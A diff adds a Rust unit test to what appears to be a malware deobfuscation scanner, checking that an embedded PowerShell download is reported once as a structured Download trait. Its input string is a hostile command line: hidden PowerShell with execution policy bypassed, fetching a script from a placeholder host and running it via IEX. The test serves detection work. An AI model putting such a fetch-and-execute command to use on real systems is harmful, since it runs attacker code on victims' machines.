@@ -14495,6 +14495,42 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn deob_text_embedded_powershell_iwr_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"w.Run "!powershell -WindowStyle Hidden -Nologo -ExecutionPolicy Bypass -Command ""Invoke-WebRequest -Uri https://embedded-ps.example/fp.ps1 -UseBasicParsing | IEX ""!", 0, False"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://embedded-ps.example/fp.ps1"
+            )
+        });
+        assert!(
+            has,
+            "embedded PowerShell IWR URL not typed as Download: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. }
+                        if src == "https://embedded-ps.example/fp.ps1"
+                )
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "embedded PowerShell IWR URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn telegram_bot_prefix_of_known_download_not_double_emitted() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.traits.push(Trait::Download {
